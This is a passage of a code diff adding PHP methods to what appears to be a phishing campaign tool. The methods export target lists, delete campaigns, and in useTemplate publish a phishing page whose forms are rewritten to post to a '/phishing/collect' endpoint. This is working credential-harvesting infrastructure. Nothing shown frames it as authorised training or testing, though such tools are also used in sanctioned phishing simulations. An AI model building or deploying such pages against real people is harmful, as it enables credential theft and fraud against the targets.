+                    $t['last_seen'] ? date('Y-m-d H:i:s', $t['last_seen']) : '',
+                    $t['data']
+                ]);
+            }
+            rewind($output);
+            return stream_get_contents($output);
+        } elseif ($format === 'json') {
+            return json_encode($targets, JSON_PRETTY_PRINT);
+        }
+        return '';
+    }
+
+    public function deleteCampaign($campaignId) {
+        $this->db->exec("BEGIN TRANSACTION");
+        try {
+            $campaign = $this->getCampaign($campaignId);
+            if ($campaign && !empty($campaign['clone_path'])) {
+                $cloneDir = $this->config['public_dir'] . 'pages/' . basename($campaign['clone_path']) . '/';
+                if (is_dir($cloneDir)) {
+                    $this->delTree($cloneDir);
+                }
+            }
+
+            $stmt = $this->db->prepare("DELETE FROM emails WHERE campaign_id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $stmt = $this->db->prepare("DELETE FROM targets WHERE campaign_id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $stmt = $this->db->prepare("DELETE FROM campaigns WHERE id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $this->db->exec("COMMIT");
+            $this->log('INFO', 'Campaign deleted', ['id' => $campaignId]);
+        } catch (Exception $e) {
+            $this->db->exec("ROLLBACK");
+            throw $e;
+        }
+    }
+
+    private function delTree($dir) {
+        if (!is_dir($dir)) return;
+        $files = array_diff(scandir($dir), ['.', '..']);
+        foreach ($files as $file) {
+            $path = $dir . '/' . $file;
+            is_dir($path) ? $this->delTree($path) : unlink($path);
+        }
+        rmdir($dir);
+    }
+
+    public function useTemplate($campaignId, $templateName) {
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) {
+            throw new InvalidArgumentException("Campaign not found.");
+        }
+
+        $templateFile = dirname(__DIR__, 2) . '/system/templates/phishing/' . $templateName;
+        if (!file_exists($templateFile)) {
+            throw new RuntimeException("Template file not found: $templateFile");
+        }
+
+        $html = file_get_contents($templateFile);
+        if ($html === false) {
+            throw new RuntimeException("Failed to read template file: $templateFile");
+        }
+
+        $dom = new DOMDocument();
+        libxml_use_internal_errors(true);
+        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
+        libxml_clear_errors();
+
+        $forms = $dom->getElementsByTagName('form');
+        foreach ($forms as $form) {
+            $form->setAttribute('action', '/phishing/collect?campaign=' . $campaignId);
+            $form->setAttribute('method', 'post');
+        }
+
+        $html = $dom->saveHTML();
+
+        $publicBase = rtrim($this->config['public_dir'], '/') . '/pages/';
+        if (!is_dir($publicBase) && !mkdir($publicBase, 0755, true)) {
+            throw new RuntimeException("Failed to create public pages directory: $publicBase");
+        }
+
+        $cloneDir = $publicBase . preg_replace('/[^a-z0-9_-]/i', '_', $campaign['name']) . '/';
+        if (!is_dir($cloneDir) && !mkdir($cloneDir, 0755, true)) {
+            throw new RuntimeException("Failed to create clone directory: $cloneDir");
+        }
+        $clonePath = $cloneDir . 'index.html';
+        if (file_put_contents($clonePath, $html) === false) {
+            throw new RuntimeException("Failed to write clone file: $clonePath");
+        }
+
+        $publicPath = '/phishing/pages/' . basename($cloneDir) . '/';
+
+        $stmt = $this->db->prepare("UPDATE campaigns SET clone_path = :path WHERE id = :id");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        $stmt->execute();
+
+        return $publicPath;
+    }
+}
